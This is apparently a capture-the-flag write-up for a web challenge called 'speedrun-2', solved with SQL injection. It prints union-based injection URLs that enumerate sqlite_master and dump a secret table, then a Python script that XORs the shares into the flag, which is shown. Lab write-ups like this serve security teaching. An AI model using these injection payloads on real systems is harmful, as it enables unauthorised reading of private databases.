# speedrun-2

## Description
![b](https://user-images.githubusercontent.com/47029515/112105186-1bc1a280-8bd2-11eb-8319-5af0f18dc998.png)

## Solution
Looking at the script it is obvious this is an SQLi.

![1](https://user-images.githubusercontent.com/47029515/112104873-b79ede80-8bd1-11eb-8e94-1fd4c7c1b2b8.png)

The course table does not seem to contain any values useful to us. Let's try searching for other tables:

`http://challenges.ctfd.io:30026/?credits=1+union+select+1,2,3,tbl_name+FROM+sqlite_master`

![2](https://user-images.githubusercontent.com/47029515/112104884-ba99cf00-8bd1-11eb-9d4d-f98b3b731ff9.png)

We notice there is table flag_xor_shares that looks interesting. Lets try viewing the structure of the table:

`http://challenges.ctfd.io:30026/?credits=1+union+select+1,2,3,sql+FROM+sqlite_master+where+name=%27flag_xor_shares%27`

![3](https://user-images.githubusercontent.com/47029515/112110086-6f36ef00-8bd8-11eb-925c-44b34eb8f0c1.png)

`http://challenges.ctfd.io:30026/?credits=1+union+select+id,hexdigest,3,4+from+flag_xor_shares`

![Screenshot from 2021-03-21 15-00-36](https://user-images.githubusercontent.com/47029515/112104934-cbe2db80-8bd1-11eb-9e82-c7f84ab5a241.png)

The contents of the table are secret shares. XORing them together should give us the flag. I wrote a quick script for this

```python
from pwn import xor

KEY1 = bytes.fromhex("7419ccad9d5949e66614cd9458cdac149c2ad981c9f3ec56d30d03e730631c23598394a6055c55ecb5bec49dd0043b9fde76")
KEY2 = bytes.fromhex("835db37484676a462e223024a365c91fcdfe53ff975852abfacb79e0f3aef8d5b897a36c6fbfde9ca8e63b3ee00d3a1830f1")
key3 = bytes.fromhex("9c5890b6230771372122e9352ed1f3a1f644c9d4e451b81cb2f6643a067669972dc6a06617eaf08e539ada9a92b713b09b0c")
key4 = bytes.fromhex("53e5553b467e4badfcee4d97262445b27cdad3ced69a7fc69e0a04196685a61052cdd2f8a7a9650a0d861707f51403ccebc3")
key5 = bytes.fromhex("6dbdf9003a3c710afbc92a669f248c6fbe15fc550753264477436a5093614a2efc76310bb7906c911c305a0a39f566c8fc35")
flag = xor(KEY1, KEY2, key3, key4, key5)

print(flag.decode())
```

```
UDCTF{h0n3stly_we_l1k3_crypt0_a_bit_m0re_th4n_w3b}
```
